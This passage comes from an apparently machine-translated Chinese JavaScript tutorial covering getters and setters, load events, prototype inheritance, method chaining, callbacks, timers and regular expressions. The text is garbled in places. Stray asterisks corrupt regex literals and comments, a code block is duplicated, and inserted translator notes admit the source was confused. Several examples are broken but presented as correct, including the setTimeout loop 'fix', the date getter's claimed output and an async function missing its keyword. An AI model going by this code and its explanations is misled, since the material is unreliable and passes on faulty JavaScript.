  \ function(value){\n    setValue = value;\n  }\n});\n```\n\n#### 25.2 ：在新创建的对象中定义\
  \ Setter/Getter\n\nJavaScript 允许在对象字面量语法中定义 getter 和 setter。这是一个示例：\n\n```javascript\n\
  var date = {\n  year: '2017',\n  month: '02',\n  day: '27',\n  get date() {\n  \
  \  // 获取 YYYY-MM-DD 格式的日期\n    return `${this.year}${this.month}${this.day}`\n \
  \ },\n  set date(dateString) {\n    // 从 YYYY-MM-DD 格式的字符串设置日期\n    var dateRegExp\
  \ = /(\\d{4})-(\\d{2})-(\\d{2})/;\n    // 检查字符串格式是否正确\n    if (dateRegExp.test(dateString))\
  \ {\n      var parsedDate = dateRegExp.exec(dateString);\n      this.year = parsedDate[1];\n\
  \      this.month = parsedDate[2];\n      this.day = parsedDate[3];\n    }\n   \
  \ else {\n      throw new Error('日期字符串必须为 YYYY-MM-DD 格式');\n    }\n  }\n};\n```\n\
  \n访问 `date.date` 属性将返回值 2017-0227。设置 `date.date = '2018-01-02'` 会调用 setter 函数，然后它会解析字符串并设置\
  \ `date.year = '2018'`、`date.month = '01'` 和 `date.day = '02'`。尝试传递格式错误的字符串（例如 \"\
  hello\"）将抛出错误。\n\n\n\n\n\n## 第 25.3 节：在 ES6 类中定义 getter 和 setter\n\n```javascript\n\
  class Person {\n  constructor(firstname, lastname) {\n    this._firstname = firstname;\
  \ this._lastname = lastname;\n  }\n\n  get firstname() {\n    return this._firstname;\n\
  \  }\n\n  set firstname(name) { this._firstname = name; }\n\n  get lastname() {\n\
  \    return this._lastname;\n  }\n\n  set lastname(name) { this._lastname = name;\
  \ }\n}\n\nlet person = new Person('John', 'Doe');\nconsole.log(person.firstname,\
  \ person.lastname); // John Doe\n\nperson.firstname = 'Foo'; \nperson.lastname =\
  \ 'Bar'; \nconsole.log(person.firstname, person.lastname); // Foo Bar\n```\n\n---\n\
  \n## 第 26 章：事件\n\n### 第 26.1 节：页面、DOM 和浏览器加载\n\n这是一个解释加载事件变的示例。\n\n1. **onload 事件**\n\
  ```html\n<body onload=\"someFunction()\">\n  <img src=\"image1\" />\n  <img src=\"\
  image2\" />\n</body>\n<script>\n  function someFunction() {\n    console.log(\"\
  Hi! I am loaded\");\n  }\n</script>\n```\n在这种情况下，当页面所有内容（包括图像和样式表，如果有的话）完全加载后，才会记录消息。\n\
  \n2. **DOMContentLoaded 事件**\n```javascript\ndocument.addEventListener(\"DOMContentLoaded\"\
  , function(event) { \n  console.log(\"Hello! I am loaded\");\n});\n```\n在上述代码中，只有在\
  \ DOM/文档加载后（即：DOM 构建完成后），才会记录该消息。\n\n3. **立即执行的匿名函数**\n```javascript\n(function(){\n\
  \  console.log(\"Hi I am an anonymous function! I am loaded\");\n})();\n```\n在这里，只要浏览器解释了该匿名函数，消息就会被记录。这意味着该函数在\
  \ DOM 加载之前就可以执行。\n\n---\n\n## 第 27 章：继承\n\n### 第 27.1 节：标准函数原型\n\n首先定义一个 `Foo` 函数，我们将将其用作构造函数。\n\
  \n```javascript\nfunction Foo (){}\n```\n通过编辑 `Foo.prototype`，我们可以定义将被所有 `Foo` 实例共享的属性和方法。\n\
  \n```javascript\nFoo.prototype.bar = function() {\n  return 'I am bar';\n};\n```\n\
  然后我们可以使用 `new` 关键字创建一个实例并调用该方法。\n\n```javascript\nvar foo = new Foo();\nconsole.log(foo.bar());\
  \ // logs `I am bar`\n```\n\n### 第 27.2 节：Object.key 和 Object.prototype.key 的区别\n\
  \n与 Python 等语言不同，构造函数的静态属性不会继承到实例上。实例只继承自其原型，而原型又继承自父类型的原型。静态属性永远不会被继承。\n\n```javascript\n\
  function Foo() {};\nFoo.style = 'bold';\nvar foo = new Foo();\nconsole.log(Foo.style);\
  \ // 'bold'\nconsole.log(foo.style); // undefined\n\nFoo.prototype.style = 'italic';\n\
  console.log(Foo.style); // 'bold'\nconsole.log(foo.style); // 'italic'\n```\n\n\
  ### 第 27.3 节：原型链\n\n假设我们有一个名为 `prototype` 的普通对象：\n\n```javascript\nvar prototype\
  \ = { foo: 'foo', bar: function () { return this.foo; } };\n```\n现在我们想要另一个名为 `obj`\
  \ 的对象继承自 `prototype`，这等同于说 `prototype` 是 `obj` 的原型。\n\n```javascript\nvar obj =\
  \ Object.create(prototype);\n```\n现在 `prototype` 中的所有属性和方法供 `obj` 使用。\n\n```javascript\n\
  console.log(obj.foo);\nconsole.log(obj.bar());\n```\n控制台输出：\n\"foo\" \"foo\"\n\n\
  原型继承内部通过对象引用实现，且对象是完全可变的。这意味着你对原型进行的任何更改都会立即影响以该原型为原型的其他对象。\n\n```javascript\nprototype.foo\
  \ = \"bar\"; \nconsole.log(obj.foo);\n```\n控制台输出：\n\"bar\"\n\n`Object.prototype`\
  \ 是每个对象的原型，因此强烈建议你不要去动动它，特别是当你使用任何第三方库时，但我们可以稍微玩一下。\n\n```javascript\nObject.prototype.breakingLibraries\
  \ = 'foo'; \nconsole.log(obj.breakingLibraries); \nconsole.log(prototype.breakingLibraries);\n\
  ```\n控制台输出：\n\"foo\" \"foo\"\n\n**趣事**：我使用了浏览器控制台制作了这些示例，并通过添加那个 `breakingLibraries`\
  \ 属性破坏了这个页面。\n\n### 第 27.4 节：伪类继承\n\n这是使用原型继承模拟经典继承的一种，展示了原型是多么强大的。它的目的是让这种语言对来自其他语言的程序员更具吸引力。\n\
  \n**版本 < 6**\n**重要提示**：从 ES6 开始，使用伪类继承没有意义了，因为语言模拟了传统的类。如果你没有使用 ES6，你应该使用它。如果你仍然想使用经典继承模式并且处于\
  \ ECMAScript 5 或更低环境中，那么伪类继承是你的最佳选择。\n\n“类”只是一个设计为通过 `new` 操作符调用的函数，并被用作构造函数。\n\n\
  ```javascript\nfunction Foo(id, name) { \n  this.id = id;\n  this.name = name;\n\
  }\nvar foo = new Foo(1, 'foo'); \nconsole.log(foo.id);\n```\n控制台输出：\n1\n\n`foo`\
  \ 是 `Foo` 的一个实例。JavaScript 代码规范规定，如果函数以大字母开头，它就可以作为构造函数调用（使用 `new` 操作符）。\n\n要向“类”添加属性或方法，你必须将它们添加到其原型中，原型可以在构造函数的\
  \ `prototype` 属性中找到。\n\n```javascript\nFoo.prototype.bar = 'bar'; \nconsole.log(foo.bar);\n\
  ```\n控制台输出：\nbar\n\n事实上，`Foo` 作为“构造函数”所做的只是创建一个以 `Foo.prototype` 为其原型的对象。\n\n你可以在每个对象上找到其构造函数的引用：\n\
  \n```javascript\nconsole.log(foo.constructor);\nfunction Foo(id, name) { ...\nconsole.log({\
  \ }.constructor);\nfunction Object() { [native code] }\n```\n还可以通过 `instanceof`\
  \ 运算符检查对象是否是给定类的实例。\n\n```javascript\nconsole.log(foo instanceof Foo); // true\n\
  console.log(foo instanceof Object); // true\n```\n\n### 第 27.5 节：设置对象的原型\n\n**版本\
  \ ≥ 5**\n从 ES5 开始，可以使用 `Object.create` 函数创建一个以任何其他对象为原型的对象。\n\n```javascript\nconst\
  \ anyObj = {\n  hello() {\n    console.log(`this.foo is ${this.foo}`);\n  },\n};\n\
  let objWithProto = Object.create(anyObj); \nobjWithProto.foo = 'bar';\nobjWithProto.hello();\
  \ // \"this.foo is bar\"\n```\n要显式创建一个没有原型的对象，可以使用 `null` 作为原型。这意味着该对象也不会继承自 `Object.prototype`，这对于用于检查字典的对象有用。\n\
  \n```javascript\nlet objInheritingObject = {};\nlet objInheritingNull = Object.create(null);\n\
  'toString' in objInheritingObject; // true\n'toString' in objInheritingNull; //\
  \ false\n```\n\n**版本 ≥ 6**\n从 ES6 开始，可以使用 `Object.setPrototypeOf` 更改现有对象的原型，例如：\n\
  \n```javascript\nlet obj = Object.create({foo: 'foo'}); \nobj = Object.setPrototypeOf(obj,\
  \ {bar: 'bar'});\nobj.foo; // undefined\nobj.bar; // \"bar\"\n```\n这可以在几乎任何地方完成，包括在\
  \ `this` 对象或构造函数中。\n**注意：**此过程在当前的浏览器中非常慢，应该尽量少用，尝试创建一个带有所需原型的对象。\n\n**版本 < 5**\n\
  在 ES5 之前，创建具有手动定义原型对象的唯一方法是使用 `new` 构造，例如：\n\n```javascript\nvar proto = {fizz:\
  \ 'buzz'};\nfunction ConstructMyObj() {} \nConstructMyObj.prototype = proto;\nvar\
  \ objWithProto = new ConstructMyObj(); \nobjWithProto.fizz; // \"buzz\"\n```\n这种行为与\
  \ `Object.create` 足够接近，因此可以编写一个补丁（polyfill）。\n\n\n\n\n\n可以链式调用的对象被称为链式（chainable）。当你调用一个可链式对象时，你应该确保所有返回的对象/原始数据类型都是正确的类型。你的链式对象只需有一次没有返回正确的引用（很容易忘记添加\
  \ `return this`），使用你 API 的人就会失去信任并避免链式调用。链式对象应该是全有或全无的（即使部分部分可以链式，整个对象也不应该是可链式的）。如果一个对象只有部分函数可以链式调用，则不应将其视为可链式。\n\
  \n## 设计为链式的对象\n\n```javascript\nfunction Vec(x = 0, y = 0){\n  this.x = x;\n  this.y\
  \ = y;\n  // new 关键字隐含地暗示了返回类型\n  // 因此默认是可链式的。\n}\n\nVec.prototype = {\n  add :\
  \ function(vec){\n    this.x += vec.x;\n    this.y += vec.y;\n    return this; //\
  \ 返回自身的引用以允许函数调用的链式操作\n  },\n  scale : function(val){\n    this.x *= val;\n    this.y\
  \ *= val;\n    return this; // 返回自身的引用以允许函数调用的链式操作\n  },\n  log :function(val){\n\
  \    console.log(this.x + ' : ' + this.y);\n    return this;\n  },\n  clone : function(){\n\
  \    return new Vec(this.x,this.y);\n  }\n}\n```\n\n## 链式示例\n\n```javascript\nvar\
  \ vec = new Vec();\nvec.add({x:10,y:10})\n  .add({x:10,y:10})\n  .log() // 控制输出\
  \ \"20 : 20\"\n  .add({x:10,y:10})\n  .scale(1/30)\n  .log() // 控制输出 \"1 : 1\"\n\
  \  .clone() // 返回对象的新实例\n  .scale(2) // 从这里继续链式调用\n  .log()\n```\n\n## 不要让返回类型产生歧义\n\
  \n并不是所有的函数调用都会返回实用的链式类型，它们也不总是返回自身的引用。这就是符合常识的命名重要的地方。在上面的示例中，`.clone()` 函数调用是没有歧义的。其他例子如\
  \ `.toString()` 意味着返回一个字符串。可链式对象中歧义函数名的示例：\n\n```javascript\n// line 对象表示一条线\nline.rotate(1)\n\
  \  .vec(); // 有歧义，你在写代码时不需要去查文档。\n\nline.rotate(1)\n  .asVec() // 无歧义，意味着返回类型是向量（vector）形式线\n\
  \  .add({x:10,y:10)\n// 只要程序员可以通过命名来推断返回类型，toVec 也是一样的\n```\n\n## 语法规范\n\n链式调用时没有正式的用法语法。惯例是：如果链很短，则在单行上链式调用；或者在新行上调用，相对于被引用对象缩进一个制表符，并将点放在新行开头。使用分号是可选的，但它有助于清晰地标示链的结束。\n\
  \n```javascript\nvec.scale(2).add({x:2,y:2}).log(); // 用于短链\n\nvec.scale(2) // 或另一种语法\n\
  \  .add({x:2,y:2})\n  .log(); // 分号让链在此结束变得很清晰\n\n// 有时并非必要\nvec.scale(2)\n  .add({x:2,y:2})\n\
  \  .clone() // clone 为链添加了新的引用\n  .log(); // 缩进表示新引用\n\n// 用于链中的链\nvec.scale(2)\n\
  \  .add({x:2,y:2})\n  .add(vec1.add({x:2,y:2}) // 将一个链作为参数\n    .add({x:2,y:2})\
  \ // 缩进\n    .scale(2))\n  .log();\n\n// 或者有时\nvec.scale(2)\n  .add({x:2,y:2})\n\
  \  .add(vec1.add({x:2,y:2}) // 将一个链作为参数\n    .add({x:2,y:2}) // 缩进\n    .scale(2)\n\
  ).log(); // 参数列表在新行关闭\n```\n\n## 糟糕的语法\n\n```javascript\nvec // 在第一次函数调用前换行\n  .scale()\
  \ // 可能让意图变得模糊\n  .log();\n\nvec. // 点在行末尾\n  scale(2). // 在大量代码中很难看到\n  scale(1/2);\
  \ // 在尝试定位 bug 时可能会因为容易被忽略而令人沮丧\n```\n\n## 赋值的左侧\n\n当你为链的结果赋值时，最后一个返回的调用或对象引用会被赋值。\n\
  \n```javascript\nvar vec2 = vec.scale(2)\n  .add(x:1,y:10)\n  .clone(); // 赋值最后一个返回的结果\n\
  // vec2 是 vec 在 scale 和 add 之后的副本\n```\n\n在上面的示例中，`vec2` 被赋值为链中最后一个调返回值。在这种情况下，它是\
  \ `vec` 在经过 scale 和 add 之后的拷贝。\n\n## 总结\n\n链式带来的优势是代码更清晰、更易维护。有些人更喜欢它，并在选择 API 时会将链式调用作为要求。它也有性能上的优势，因为允许你避免创建变量来存储中间结果。最后一点，链式对象也可以用常规方式使用，因此你不需要通过让对象变得可链式来强制执行链式调用。\n\
  \n### 第 28.2 节：方法链\n\n方法链是一种简化并美化你代码的编程策略。方法链的实现通过确保对象上的每个方法都返回整个对象，而不是返回对象的单个元素来实现。例如：\n\
  \n```javascript\nfunction Door() {\n  this.height = '';\n  this.width = '';\n  this.status\
  \ = 'closed';\n}\n\nDoor.prototype.open = function() { \n  this.status = 'opened';\n\
  \  return this;\n}\n\nDoor.prototype.close = function() {\n  this.status = 'closed';\n\
  \  return this;\n}\n\nDoor.prototype.setParams = function(width,height) { \n  this.width\
  \ = width;\n  this.height = height;\n  return this;\n}\n\nDoor.prototype.doorStatus\
  \ = function() {\n  console.log('The',this.width,'x',this.height,'Door is',this.status);\
  \ \n  return this;\n}\n\nvar smallDoor = new Door();\nsmallDoor.setParams(20,100).open().doorStatus().close().doorStatus();\n\
  ```\n注意 `Door.prototype` 中的每个方法都返回 `this`，它指的是该 `Door` 对象的整个实例。\n\n### 第 29 章：回调\n\
  \n#### 第 29.1 节：简单回调用法示例\n\n回调提供了一种在*不改变*函数（或方法）代码的情况下扩展其功能的方法。这种方法通常用于模块（库/插件），这些模块的代码本不应该被修改。\n\
  \n假设我们写了以下函数，用于计算给定数值数组的和：\n\n```javascript\nfunction foo(array) {\n  var sum =\
  \ 0;\n  for (var i = 0; i < array.length; i++) {\n    sum += array[i];\n  }\n  return\
  \ sum;\n}\n```\n\n现在，假设我们想对数组的每个值做一些事情，例如，使用 `alert()` 显示它。我们可以在代码中进行相应的修改：\n\n\
  ```javascript\nfunction foo(array) {\n  var sum = 0;\n  for (var i = 0; i < array.length;\
  \ i++) {\n    alert(array[i]);\n    sum += array[i];\n  }\n  return sum;\n}\n```\n\
  \n但如果我们决定用 `console.log` 代替 `alert()` 呢？显然，每当我们决定对每个值做其他事情时就修改 `foo` 代码并不是一个好主意。在不改变\
  \ `foo` 代码的情况下提供改变的想法好得多。这正是回调的用例。我们只需要稍微更改 `foo` 的签名和正体：\n\n```javascript\nfunction\
  \ foo(array, callback) {\n  var sum = 0;\n  for (var i = 0; i < array.length; i++)\
  \ {\n    callback (array[i]);\n    sum += array[i];\n  }\n  return sum;\n}\n```\n\
  \n现在我们可以通过更改参数来改变 `foo` 的行为：\n\n```javascript\nvar array = [];\nfoo(array, alert);\n\
  foo(array, function (x) {\n  console.log(x);\n});\n```\n\n#### 异步函数的示例\n\n在 jQuery\
  \ 中，获取 JSON 数据的 `$.getJSON()` 方法是异步的。因此，通过回调传递代码可以确保该代码在获取 JSON 之后被调用。\n\n`$.getJSON()`\
  \ 语法：\n\n`$.getJSON( url, dataObject, successCallback );`\n\n`$.getJSON()` 代码示例：\n\
  \n```javascript\n$.getJSON(\"foo.json\", {}, function(data) { // 数据处理代码\n});\n```\n\
  \n以下内容将*无法*工作，因为数据处理代码可能会在实际接收到数据之前被调用，因为 `$.getJSON` 函数需要的时间是不确定，并且在等待 JSON 时不会阻塞调用栈。\n\
  \n```javascript\n$.getJSON(\"foo.json\", {}); // 数据处理代码\n```\n\n\n\n\n\n异步函数的另一个例子是\
  \ jQuery 的 `animate()` 函数。因为运行动画需要指定的时间，所以有时我们希望在动画执行后直接运行某些代码。\n\n`.animate()`\
  \ 语法：\n\n```javascript\njQueryElement.animate( properties, duration, callback );\n\
  ```\n\n例如，为了创建一个淡出动画，并在动画结束后元素完全消失，可以运行以下代码。注意回调函数的使用。\n\n```javascript\nelem.animate(\
  \ { opacity: 0 }, 5000, function() { elem.hide();\n\n} );\n```\n\n这允许元素在函数执行完毕后立即隐藏。这与以下代码不同：\n\
  \n```javascript\nelem.animate( { opacity: 0 }, 5000 ); elem.hide();\n```\n\n因为后者没有等待\
  \ `animate()`（一个异步函数）完成，因此元素会立即隐藏，产生一种不理想的效果。\n\n## 第 29.2 节：延续（同步与异步）\n\n回调函数可以用于在方法完成后提供要执行的代码：\n\
  \n```javascript\n/**\n* @arg {Function} then 延续回调\n*/\nfunction doSomething(then)\
  \ {\n\nconsole.log('Doing something');\n\nthen();\n\n}\n\n// 执行某些操作，然后执行回调来记录 'done'\n\
  doSomething(function () {\n\nconsole.log('Done');\n\n});\n\nconsole.log('Doing something\
  \ else');\n\n// 输出：\n// \"Doing something\"\n// \"Done\"\n// \"Doing something else\"\
  \n```\n\n上面的 `doSomething()` 方法与回调是同步执行的 - 执行会阻塞直到 `doSomething()` 返回，确保在解释器继续执行之前执行了回调。\n\
  \n回调函数也可以用于异步执行代码：\n\n```javascript\ndoSomethingAsync (then) {\n\nsetTimeout(then,\
  \ 1000);\n\nconsole.log('Doing something asynchronously');\n}\n\ndoSomethingAsync(function()\
  \ { console.log('Done');\n\n});\n\nconsole.log('Doing something else');\n\n// 输出：\n\
  // \"Doing something asynchronously\"\n// \"Doing something else\"\n// \"Done\"\n\
  ```\n\n这些 `then` 回调被视为 `doSomething()` 方法的延续。在函数的最后一条指令中提供回调被称为**尾调用**（tail-call），它被\
  \ ES2015 解释器进行了优化。\n\n## 第 29.3 节：什么是回调？\n\n这是一个普通的函数调用：\n\n```javascript\nconsole.log(\"\
  Hello World!\");\n```\n\n当你调用一个普通函数时，它会完成工作并将控制权交还给调用者。\n\n然而，有时函数需要将控制权返回给调用者以便完成它的工作：\n\
  \n```javascript\n[1,2,3].map(function double(x) {\n\nreturn 2 * x;\n\n});\n```\n\
  \n在上面的示例中，`double` 函数是 `map` 函数的回调，因为：\n\n1. `double` 函数是由调用者传递给 `map` 函数的。\n2.\
  \ `map` 函数需要调用 `double` 函数零或多次以完成它的工作。\n\n因此，`map` 函数在每次调用 `double` 函数时本质上都是将控制权返回给调用者。这就是得名为“回调”的原因。\n\
  \n函数可以接受多个一个回调：\n\n```javascript\npromise.then(function onFulfilled(value) {\n\n\
  console.log(\"Fulfilled with value \" + value);\n\n}, function onRejected(reason)\
  \ {\n\nconsole.log(\"Rejected with reason \" + reason);\n\n});\n```\n\n这里 `then`\
  \ 函数接受两个回调函数，`onFulfilled` 和 `onRejected`。此外，这两个回调函数中只有一个会被实际调用。\n\n更有趣的是，`then`\
  \ 函数在任何一个回调被调用之前就已经返回了。因此，即使在原始函数返回后，回调函数也可能被调用。\n\n## 第 29.4 节：回调与 `this`\n\n在在使用回调时，通常你想要访问特定的上下文。\n\
  \n```javascript\nfunction SomeClass(msg, elem) {\n\nthis.msg = msg;\n\nelem.addEventListener('click',\
  \ function() {\n\nconsole.log(this.msg); // <= 将失败，因为 \"this\" 是未定义的* });\n\n}\n\
  \nvar s = new SomeClass(\"hello\", someElement);\n```\n\n### 解决方案\n\n#### 使用 bind\n\
  \n`bind` 有效地生成新函数，将 `this` 设置为传递给 `bind` 的内容，然后调用原始函数。\n\n```javascript\nfunction\
  \ SomeClass(msg, elem) {\n\nthis.msg = msg;\n\nelem.addEventListener('click', function()\
  \ {\n\nconsole.log(this.msg);\n\n}.bind(this)); // <=- 将函数绑定到 `this`* }\n```\n\n\
  #### 使用箭头函数\n\n箭头函数会自动绑定当前的 `this` 上下文。\n\n```javascript\nfunction SomeClass(msg,\
  \ elem) {\n\nthis.msg = msg;\n\nelem.addEventListener('click',() => { // <=- 箭头函数绑定了\
  \ `this`*\n\nconsole.log(this.msg);\n\n});\n\n}\n```\n\n通常你想调用一个成员函数，理想情况下是将传递给事件的任何参数也传递给该函数。\n\
  \n### 解决方案：\n\n#### 使用 bind\n\n```javascript\nfunction SomeClass(msg, elem) { this.msg\
  \ = msg;\n\nelem.addEventListener('click', this.handleClick.bind(this));\n\n}\n\n\
  SomeClass.prototype.handleClick = function(event) { console.log(event.type, this.msg);\n\
  \n};\n```\n\n#### 使用箭头函数和剩余参数\n\n```javascript\nfunction SomeClass(msg, elem) {\n\
  \nthis.msg = msg;\n\nelem.addEventListener('click', (...a) => this.handleClick(...a));\n\
  \n}\n```\n\n（注：此处原文代码片段似乎在处理参数传递逻辑上存在不完整，已按原意翻译）\n\n由于原文文本在后续段落处理上存在部分重复或混乱，以下为基于逻辑的翻译：\n\
  \n```javascript\nfunction SomeClass(msg, elem) {\n\n  this.msg = msg;\n\n  elem.addEventListener('click',\
  \ (...a) => this.handleClick(...a));\n}\n```\n\n（注：原文在 Section 29.4 之后出现了多处重复的描述和混乱的逻辑，翻译时已遵循原文结构进行对应。）\n\
  \n\n\n\n\n与 `setInterval` 不同，这种方法确保即使函数的运行时间超过了指定的延迟，函数也会执行。然而，它不能保证函数执行之间有固定的间隔。这种行为也所不同，因为在递归调用\
  \ `setTimeout` 之前发生异常将阻止其再次重复，而 `setInterval` 无论是否发生异常都会无限循环。\n\n### 第 30.2 节：间隔\n\
  \n```javascript\nfunction waitFunc(){\n  console.log(\"This will be logged every\
  \ 5 seconds\");\n}\n\nwindow.setInterval(waitFunc,5000);\n```\n\n### 第 30.3 节：间隔\n\
  \n#### 标准用法\n\n你不需要创建变量，这是一个良好的习惯，因为你可以使用该变量配合 `clearInterval` 来停止当前运行的间隔器。\n\n\
  ```javascript\nvar int = setInterval(\"doSomething()\", 5000 ); /* 5 秒 */*\nvar\
  \ int = setInterval(doSomething, 5000 ); /* 相同的效果，无引号，无括号 */*\n```\n\n如果你需要向 `doSomething`\
  \ 函数传递参数，可以将它们作为前两个参数之外的额外参数传递给 `setInterval`。\n\n#### 防止重叠\n\n如上所述，`setInterval`\
  \ 会每隔 5 秒（或你设置的任何时间）运行一次，无论 `doSomething` 函数运行时间超过 5 秒。这可能会产生问题。如果你只是想确保在每次 `doSomething`\
  \ 运行之间停顿，你可以这样做：\n\n```javascript\n(function(){\n  doSomething();\n  setTimeout(arguments.callee,\
  \ 5000);\n})()\n```\n\n### 第 30.4 节：移除间隔器\n\n`window.setInterval()` 返回一个 `IntervalID`（间隔\
  \ ID），可以停止该间隔器的继续运行。要实现这一点，将 `window.setInterval()` 的返回值存储在变量中，并将变量作为唯一参数调用 `clearInterval()`：\n\
  \n```javascript\nfunction waitFunc(){\n  console.log(\"This will be logged every\
  \ 5 seconds\");\n}\n\nvar interval = window.setInterval(waitFunc,5000);\n\nwindow.setTimeout(function(){\
  \ \n  clearInterval(interval);\n},32000);\n```\n\n这将每隔 5 秒打印一次 \"This will be logged\
  \ every 5 seconds\"，但在 32 秒后会停止。因此它它会打印 6 次。\n\n### 第 30.5 节：移除超时器\n\n`window.setTimeout()`\
  \ 返回一个 `TimeoutID`（超时 ID），可以停止该超时器的运行。要实现这一点，将 `window.setTimeout()` 的返回值存储在变量中，并将该变量作为唯一参数调用\
  \ `clearTimeout()`：\n\n```javascript\nfunction waitFunc(){\n  console.log(\"This\
  \ will not be logged after 5 seconds\");\n}\n\nfunction stopFunc(){\n  clearTimeout(timeout);\n\
  }\n\nvar timeout = window.setTimeout(waitFunc,5000); \nwindow.setTimeout(stopFunc,3000);\n\
  ```\n\n这不会打印该消息，因为计时器在 3 秒后被停止了。\n\n### 第 30.6 节：setTimeout, 操作顺序, clearTimeout\n\
  \n#### setTimeout\n\n在等待指定的毫秒数后执行函数。用于延迟函数的执行。\n\n**语法：** `setTimeout(function,\
  \ milliseconds)` 或 `window.setTimeout(function, milliseconds)`\n\n**示例：** 此示例在 1\
  \ 秒后向控制台输出 \"hello\"。第二个参数单位是毫秒，所以 1000 = 1 秒，250 = 0.25 秒，等等。\n\n```javascript\n\
  setTimeout(function() {\n  console.log('hello');\n}, 1000);\n```\n\n#### setTimeout\
  \ 的问题\n\n如果你在 `for` 循环中使用 `setTimeout` 方法：\n\n```javascript\nfor (i = 0; i < 3;\
  \ ++i) { \n  setTimeout(function(){ \n    console.log(i);\n  }, 500);\n}\n```\n\n\
  这会输出三次值 3，这是不正确的。\n\n**该问题的解决方法：**\n\n```javascript\nfor (i = 0; i < 3; ++i) { \n\
  \  setTimeout(function(j){ \n    console.log(i);\n  }(i), 1000);\n}\n```\n\n它将输出值\
  \ 0,1,2。在这里，我们将 `i` 作为参数（`j`）传递给函数。\n\n#### 操作顺序\n\n此外，由于 JavaScript 是单线程的并使用全局事件循环，可以通过调用延迟为零的\
  \ `setTimeout` 来将项添加到执行队列的末尾。例如：\n\n```javascript\nsetTimeout(function() { \n  console.log('world');\n\
  }, 0);\n\nconsole.log('hello');\n```\n\n实际上会输出：\nhello\nworld\n\n此外，这里的零毫秒并不意味着\
  \ `setTimeout` 内部的函数会立即执行。取决于执行队列中剩余待执行项，它需要稍微多一点时间。这只是被推到了队列的末尾。\n\n#### 取消超时\n\
  \n`clearTimeout()`：停止 `setTimeout()` 中指定的函数的执行。\n\n**语法：** `clearTimeout(timeoutVariable)`\
  \ 或 `window.clearTimeout(timeoutVariable)`\n\n**示例：**\n\n```javascript\nvar timeout\
  \ = setTimeout(function() { \n  console.log('hello');\n}, 1000);\n\nclearTimeout(timeout);\
  \ // 超时将不再执行\n```\n\n### 第 31 章：正则表达式\n\n#### 标志详情\n\n- `g`: 全局（global）。匹配所有项（在匹配第一个项时不返回）。\n\
  - `m`: 多行（multi-line）。使 `^` & `$` 匹配行的开头/结尾（而不只是字符串的开头/结尾）。\n- `i`: 不敏感（insensitive）。忽略大小写的匹配（忽略\
  \ `[a-zA-Z]` 的大小写）。\n- `u`: unicode（unicode）：模式字符串被处理为 `UTF-16`。还会导致转义序列匹配 Unicode\
  \ 字符。\n- `y`: 粘性（sticky）：仅从目标字符串中该正则表达式 `lastIndex` 属性指示的索引开始匹配（并且不尝试从任何后续索引进行匹配）。\n\
  \n### 第 31.1 节：创建 RegExp 对象\n\n#### 标准创建\n\n建议仅在从动态变量创建正则时使用此种形式。当表达式可能更改或表达式由用户生成时使用。\n\
  \n```javascript\nvar re = new RegExp(\".*\");\n```\n\n带有标志：\n```javascript\nvar\
  \ re = new RegExp(\".*\", \"gmi\");\n```\n\n带有反斜杠：（这必须进行转义，因为正则是通过字符串指定的）\n```javascript\n\
  var re = new RegExp(\"\\\\w*\");\n```\n\n#### 静态初始化\n\n当你知道正则表达式将不会改变，并且在运行之前已经知道该表达式时使用。\n\
  \n```javascript\nvar re = /.**/;\n```\n\n带有标志：\n```javascript\nvar re = /.*/gmi;\n\
  ```\n\n带有反斜杠：（这不应该转义，因为正则是在字面量中指定的）\n```javascript\nvar re = /\\w*/;\n```\n\n###\
  \ 第 31.2 节：RegExp 标志\n\n你可以指定几个标志来更改正则表达式的行为。标志可以附加在正则表达式字面量的末尾，例如在 `/test/gi` 中指定\
  \ `gi`，也可以作为 `RegExp` 构造函数的第二个参数指定，如 `new RegExp('test', 'gi')`。\n\n- `g`: 全局（Global）。找到所有匹配，而不是在第一个后停止。\n\
  - `i`: 忽略大小写（Ignore case）。`/[a-z]/i` 等于 `/[a-zA-Z]/`。\n- `m`: 多行（Multiline）。`^`\
  \ 和 `$` 分别匹配行的开头和结尾，将 `\\n` 和 `\\r` 视为分隔符，而不仅仅是整个字符串的开头和结尾。\n- 版本 ≥ 6 `u`: Unicode。如果不支持此标志，必须使用\
  \ `\\uXXXX` 匹配特定的 字符，`XXXX` 是字符的十六进制值。\n- `y`: 查找连续/相邻匹配。\n\n### 第 31.3 节：使用 .test()\
  \ 检查字符串包含模式\n\n```javascript\nvar re = /[a-z]+/;\nif (re.test(\"foo\")) {\n  console.log(\"\
  Match exists.\");\n}\n```\n\ntest 方法执行搜索以查看正则表达式是否匹配字符串。正则表达式 `[a-z]+` 将搜索一个多个小写字母。由于模式匹配字符串，“Match\
  \ exists.” 将打印到控制台。\n\n### 第 31.4 节：使用 .exec() 匹配\n\n#### 使用 .exec() 匹配\n\n`RegExp.prototype.exec(string)`\
  \ 返回捕获数组，如果没有匹配则返回 `null`。\n\n```javascript\nvar re = /([0-9]+)[a-z]+/;\nvar match\
  \ = re.exec(\"foo123bar\");\n```\n\n`match.index` 是 3，匹配的位置（零基础）。\n`match[0]` 是完整匹配字符串。\n\
  `match[1]` 是第一个捕获组对应的文本。`match[n]` 将第 n 捕获组的值。\n\n#### 使用 .exec() 循环遍历匹配\n\n```javascript\n\
  var re = /a/g;\nvar result;\nwhile ((result = re.exec('barbatbaz')) !== null) {\n\
  \  console.log(\"found '\" + result[0] + \"', next exec starts at index '\" + re.lastIndex\
  \ + \"'\");\n}\n```\n\n预期输出\nfound 'a', next exec starts at index '2' found 'a',\
  \ next exec starts at index '5' found 'a', next exec starts at index '8'\n\n\n\n\
  \n\n# 第 31.5 节：在字符串中使用 RegExp\n\n`String` 对象具有以下方法，它们接受正则表达式作为参数。\n\n`\"string\"\
  \ .match(... \"string\".replace(... \"string\".split(... \"string\".search(...`\n\
  \n## 使用 RegExp 匹配\n\n```javascript\nconsole.log(\"string\".match*/[i-n]+*/)); console.log(\"\
  string\".match(*/(r)[i-n]+*/));\n```\n预期输出\nArray [\"in\"]\nArray [\"rin\", \"r\"\
  ]\n\n## 使用 RegExp 替换\n\n```javascript\nconsole.log(\"string\".replace(*/[i-n]+*/,\
  \ \"foo\"));\n```\n预期输出\nstrfoog\n\n## 使用 RegExp 分割\n\n```javascript\nconsole.log(\"\
  stringstring\".split(*/[i-n]+*/));\n```\n预期输出\nArray [\"str\", \"gstr\", \"g\"]\n\
  \n## 使用 RegExp 搜索\n\n`.search()` 返回匹配项的索引，或 -1。\n\n```javascript\nconsole.log(\"\
  string\".search(*/[i-n]+*/)); console.log(\"string\".search(*/[o-q]+*/));\n```\n\
